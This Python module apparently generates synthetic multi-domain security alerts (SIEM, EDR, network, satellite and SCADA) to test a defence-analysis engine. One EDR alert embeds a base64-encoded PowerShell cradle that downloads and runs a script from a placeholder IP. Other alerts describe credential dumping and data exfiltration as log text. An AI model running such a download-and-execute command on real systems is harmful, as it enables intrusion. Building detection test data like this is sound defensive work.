"""
Multi-Domain Synthetic Defense Telemetry Generator
Generates realistic, synchronized, multi-source telemetry spanning Cyber SIEM (CEF/Syslog),
EDR process execution, Satellite/EW anomalies, and OSINT advisories.
"""

import uuid
from datetime import datetime, timedelta, timezone
from typing import List, Dict, Any
from src.engine.schemas import RawTelemetryAlert, TelemetryDomain


def generate_apt_hybrid_campaign(sector: str = "Sector-4-North") -> List[RawTelemetryAlert]:
    """
    Generates a synchronized, multi-domain APT campaign (e.g. Sandworm / APT28):
    Phase 1: Satellite RF jamming / telemetry degradation
    Phase 2: Edge firewall credential stuffing (T1078)
    Phase 3: EDR Base64 PowerShell execution (T1059.001)
    Phase 4: C2 HTTPS beaconing (T1071.001)
    Phase 5: SCADA Ground Station PLC command injection (T0814)
    """
    now = datetime.now(timezone.utc)
    alerts = []

    # 1. Satellite / EW Anomaly
    alerts.append(RawTelemetryAlert(
        alert_id=f"SAT-{uuid.uuid4().hex[:8].upper()}",
        timestamp=(now - timedelta(minutes=14)).isoformat(),
        domain=TelemetryDomain.SATELLITE_EW,
        source_name="SAT-GROUND-RELAY-04",
        raw_payload="ANOMALY: High-power RF carrier jamming detected on 14.2 GHz uplink. Signal-to-Noise Ratio (SNR) dropped by 18.4 dB. Transponder lock lost on SAT-DEF-09.",
        sector=sector,
        target_entity="SAT-DEF-09",
        event_code="SAT_RF_JAM_ALERT",
        metadata={"snr_drop_db": 18.4, "frequency_ghz": 14.2, "carrier_band": "Ku-Band"}
    ))

    # 2. Cyber SIEM (QRadar CEF format) - Credential Stuffing
    alerts.append(RawTelemetryAlert(
        alert_id=f"SIEM-{uuid.uuid4().hex[:8].upper()}",
        timestamp=(now - timedelta(minutes=11)).isoformat(),
        domain=TelemetryDomain.CYBER_SIEM,
        source_name="IBM-QRadar-SIEM",
        raw_payload="CEF:0|IBM|QRadar|7.5.0|AUTH_FAIL_BURST|1,420 failed SSH logins within 45 seconds on Gateway-04|9|src=198.51.100.44 dst=10.4.1.1 suser=svc_satcomm msg=Multiple authentication failures followed by single successful login",
        sector=sector,
        target_entity="10.4.1.1 (Gateway-04)",
        source_ip="198.51.100.44",
        destination_ip="10.4.1.1",
        event_code="AUTH_FAIL_BURST",
        metadata={"failed_attempts": 1420, "compromised_user": "svc_satcomm"}
    ))

    # 3. Cyber EDR (Process Execution) - Encoded PowerShell
    alerts.append(RawTelemetryAlert(
        alert_id=f"EDR-{uuid.uuid4().hex[:8].upper()}",
        timestamp=(now - timedelta(minutes=8)).isoformat(),
        domain=TelemetryDomain.CYBER_EDR,
        source_name="CrowdStrike-Falcon-EDR",
        raw_payload="PROCESS_INJECTION: powershell.exe -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADgALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA== spawned by svc_satcomm on S4-GW-01. Attempted LSASS memory dump.",
        sector=sector,
        target_entity="S4-GW-01",
        source_ip="10.4.1.1",
        event_code="EDR_PROCESS_SUSPICIOUS",
        metadata={"process_name": "powershell.exe", "parent_process": "sshd.exe", "encoded_command": True}
    ))

    # 4. Network Sensor - C2 Beaconing
    alerts.append(RawTelemetryAlert(
        alert_id=f"NET-{uuid.uuid4().hex[:8].upper()}",
        timestamp=(now - timedelta(minutes=5)).isoformat(),
        domain=TelemetryDomain.CYBER_SIEM,
        source_name="Suricata-NIDS",
        raw_payload="SURICATA_ALERT: Suspicious periodic HTTPS outbound beaconing (jitter 3.2%) to known APT C2 node 203.0.113.88:443. JA3 TLS fingerprint matches Cobalt Strike malleable C2 profile.",
        sector=sector,
        target_entity="S4-GW-01",
        source_ip="10.4.1.1",
        destination_ip="203.0.113.88",
        event_code="NIDS_C2_BEACON",
        metadata={"ja3_hash": "e7d705a3286e19ea42f587b344ee6865", "beacon_interval_sec": 30}
    ))

    # 5. SCADA / Satellite Controller Tampering
    alerts.append(RawTelemetryAlert(
        alert_id=f"ICS-{uuid.uuid4().hex[:8].upper()}",
        timestamp=(now - timedelta(minutes=2)).isoformat(),
        domain=TelemetryDomain.SATELLITE_EW,
        source_name="SCADA-GROUND-PLC-02",
        raw_payload="CRITICAL: Unauthorized Modbus/TCP command (Function Code 16 - Write Multiple Holding Registers) sent to Satellite Antenna Azimuth/Elevation Controller from S4-GW-01. Commanded 45-degree off-axis misalignment.",
        sector=sector,
        target_entity="PLC-AZ-EL-02",
        source_ip="10.4.1.1",
        event_code="ICS_MODBUS_UNAUTHORIZED_WRITE",
        metadata={"function_code": 16, "unit_id": 1, "tampered_register": "ANTENNA_SLEW_RATE"}
    ))

    return alerts


def generate_adversarial_chaff_flood(sector: str = "Sector-2-East", count: int = 50) -> List[RawTelemetryAlert]:
    """
    Generates an engineered adversarial alert flood (chaff) designed to cause alert fatigue,
    with 1 high-entropy stealth zero-day alert buried inside.
    """
    now = datetime.now(timezone.utc)
    alerts = []

    # 49 Decoy noisy port scan alerts (low entropy, high repetition)
    for i in range(count - 1):
        alerts.append(RawTelemetryAlert(
            alert_id=f"CHAFF-{i:04d}",
            timestamp=(now - timedelta(seconds=i * 2)).isoformat(),
            domain=TelemetryDomain.CYBER_SIEM,
            source_name="Edge-Firewall-Noise",
            raw_payload=f"FW_DROP: Inbound TCP SYN probe dropped from {192}.{0}.{2}.{i%250} on port {1000 + i}. No service listening.",
            sector=sector,
            target_entity="Edge-Firewall-Cluster",
            source_ip=f"192.0.2.{i%250}",
            event_code="FW_SYN_DROP",
            metadata={"is_synthetic_decoy": True}
        ))

    # 1 Stealthy Critical Alert hidden in the chaff
    alerts.append(RawTelemetryAlert(
        alert_id=f"STEALTH-001",
        timestamp=(now - timedelta(seconds=25)).isoformat(),
        domain=TelemetryDomain.CYBER_EDR,
        source_name="CrowdStrike-Falcon-EDR",
        raw_payload="ZERO_DAY_EXFIL: Stealth privilege escalation via dirty pipe exploit followed by unencrypted database dump of tactical operational plans to external VPS 198.51.100.99.",
        sector=sector,
        target_entity="Ops-Database-Core",
        source_ip="10.2.0.50",
        destination_ip="198.51.100.99",
        event_code="STEALTH_DATA_EXFIL",
        metadata={"is_synthetic_decoy": False, "high_value_target": "Ops-Database-Core"}
    ))

    return alerts


def generate_benign_background_noise(sector: str = "Sector-3-Central") -> List[RawTelemetryAlert]:
    """Generates routine false positives: backup scripts, NTP sync, automated vulnerability scan."""
    now = datetime.now(timezone.utc)
    return [
        RawTelemetryAlert(
            alert_id="BENIGN-01",
            timestamp=(now - timedelta(minutes=20)).isoformat(),
            domain=TelemetryDomain.CYBER_SIEM,
            source_name="Nessus-Vulnerability-Scanner",
            raw_payload="INFO: Scheduled weekly authorized vulnerability scanner 10.3.0.254 scanned 50 hosts in Subnet 10.3.0.0/24.",
            sector=sector,
            target_entity="10.3.0.0/24",
            source_ip="10.3.0.254",
            event_code="NESSUS_SCAN_AUTHORIZED"
        ),
        RawTelemetryAlert(
            alert_id="BENIGN-02",
            timestamp=(now - timedelta(minutes=15)).isoformat(),
            domain=TelemetryDomain.CYBER_EDR,
            source_name="Veeam-Backup-Agent",
            raw_payload="INFO: High disk I/O and mass file read detected by VeeamBackupService.exe during scheduled incremental backup.",
            sector=sector,
            target_entity="FileServer-03",
            event_code="BACKUP_JOB_COMPLETED"
        )
    ]
